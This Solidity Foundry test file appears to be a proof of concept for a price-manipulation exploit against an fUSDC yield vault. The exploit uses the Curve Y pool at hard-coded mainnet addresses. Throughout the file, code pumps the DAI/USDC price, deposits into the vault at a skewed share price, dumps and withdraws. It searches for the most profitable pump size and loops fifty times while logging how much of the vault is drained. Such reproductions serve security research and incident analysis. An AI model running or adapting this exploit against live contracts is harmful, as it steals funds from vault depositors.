// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestFUSDCFlash3 is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    /// @dev Binary search for max profitable DAI pump size
    function testMaxPumpSize() public {
        uint256[] memory sizes = new uint256[](8);
        sizes[0] = 10_000_000e18;
        sizes[1] = 15_000_000e18;
        sizes[2] = 20_000_000e18;
        sizes[3] = 25_000_000e18;
        sizes[4] = 30_000_000e18;
        sizes[5] = 35_000_000e18;
        sizes[6] = 40_000_000e18;
        sizes[7] = 45_000_000e18;

        for (uint256 s = 0; s < 8; s++) {
            uint256 snapshot = vm.snapshot();
            uint256 daiPump = sizes[s];

            deal(DAI, address(this), daiPump);
            deal(USDC, address(this), daiPump / 1e12); // matching USDC for dump

            IERC20(DAI).approve(CURVE, type(uint256).max);
            IERC20(USDC).approve(CURVE, type(uint256).max);
            IERC20(USDC).approve(FUSDC, type(uint256).max);

            try this.singleIteration(daiPump) returns (int256 usdcNet, int256 daiNet) {
                emit log_named_uint("Pump size (M DAI)", daiPump / 1e24);
                emit log_named_int("USDC net", usdcNet);
                emit log_named_int("DAI net", daiNet);
                // Total profit in USD terms
                int256 totalNet = usdcNet * 1e12 + daiNet;
                emit log_named_int("Total net (DAI units)", totalNet);
                emit log("---");
            } catch {
                emit log_named_uint("REVERTED at pump (M DAI)", daiPump / 1e24);
                emit log("---");
            }

            vm.revertTo(snapshot);
        }
    }

    function singleIteration(uint256 daiPump) external returns (int256 usdcNet, int256 daiNet) {
        uint256 usdcCapital = IERC20(USDC).balanceOf(address(this));
        uint256 daiCapital = daiPump;

        // PUMP: DAI -> USDC
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        ICurveYPool(CURVE).exchange_underlying(0, 1, daiPump, 0);
        uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

        // DEPOSIT
        IHVault(FUSDC).deposit(pumpedUSDC);
        uint256 shares = IHVault(FUSDC).balanceOf(address(this));

        // DUMP: USDC -> DAI (use capital USDC)
        uint256 usdcDump = IERC20(USDC).balanceOf(address(this));
        if (usdcDump > usdcCapital) usdcDump = usdcCapital;
        ICurveYPool(CURVE).exchange_underlying(1, 0, usdcDump, 0);

        // WITHDRAW
        IHVault(FUSDC).withdraw(shares);

        uint256 usdcFinal = IERC20(USDC).balanceOf(address(this));
        uint256 daiFinal = IERC20(DAI).balanceOf(address(this));

        usdcNet = int256(usdcFinal) - int256(usdcCapital);
        daiNet = int256(daiFinal) - int256(daiCapital);
    }

    /// @dev Multi-iteration test with optimal pump size
    function testMultiIter() public {
        uint256 daiPump = 15_000_000e18;
        uint256 usdcCapital = 15_000_000e6;
        uint256 iters = 50;

        deal(DAI, address(this), daiPump);
        deal(USDC, address(this), usdcCapital);

        IERC20(DAI).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        uint256 vaultBefore = IHVault(FUSDC).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        for (uint256 i = 0; i < iters; i++) {
            uint256 daiBal = IERC20(DAI).balanceOf(address(this));
            if (daiBal < 1e18) break;

            // PUMP
            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(0, 1, daiBal, 0);
            uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

            // DEPOSIT
            IHVault(FUSDC).deposit(pumpedUSDC);
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));

            // DUMP (use original USDC capital worth)
            uint256 dumpAmt = IERC20(USDC).balanceOf(address(this));
            if (dumpAmt > usdcCapital) dumpAmt = usdcCapital;
            ICurveYPool(CURVE).exchange_underlying(1, 0, dumpAmt, 0);

            // WITHDRAW
            IHVault(FUSDC).withdraw(shares);

            if (i % 10 == 0) {
                emit log_named_uint("Iter", i);
                emit log_named_uint("USDC bal", IERC20(USDC).balanceOf(address(this)));
                emit log_named_uint("DAI bal", IERC20(DAI).balanceOf(address(this)));
                emit log_named_uint("Vault remaining", IHVault(FUSDC).underlyingBalanceWithInvestment());
            }
        }

        uint256 usdcFinal = IERC20(USDC).balanceOf(address(this));
        uint256 daiFinal = IERC20(DAI).balanceOf(address(this));
        uint256 vaultAfter = IHVault(FUSDC).underlyingBalanceWithInvestment();

        emit log_named_uint("Final USDC", usdcFinal);
        emit log_named_uint("Final DAI", daiFinal);
        emit log_named_int("Net USDC", int256(usdcFinal) - int256(usdcCapital));
        emit log_named_int("Net DAI", int256(daiFinal) - int256(daiPump));
        emit log_named_uint("Vault after", vaultAfter);
        emit log_named_int("Vault drained", int256(vaultBefore) - int256(vaultAfter));
    }
}
